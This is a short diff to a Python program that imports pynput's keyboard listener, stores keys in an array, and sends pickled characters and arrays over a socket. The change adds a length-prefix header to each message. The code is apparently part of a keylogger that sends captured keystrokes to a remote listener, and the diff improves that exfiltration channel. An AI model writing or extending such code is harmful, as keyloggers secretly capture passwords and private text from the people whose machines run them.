@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 import socket
 from pickle import dumps
-
+Header = 10
 
 class Global:
     key_array = []
@@ -27,6 +27,7 @@ class Socket:
 
     def send_char(self, char):
         char = dumps(char)
+        char = bytes(f"{len(char):{Header}}", "utf-8") + char
         if Socket.connection:
             try:
                 self.active_socket.send(char)
@@ -39,6 +40,7 @@ class Socket:
     def send_array(self, array):
         if Socket.connection:
             array = dumps(array)
+            array = bytes(f"{len(array):{Header}}", "utf-8") + array
             try:
                 self.active_socket.send(array)
                 Socket.connection = True
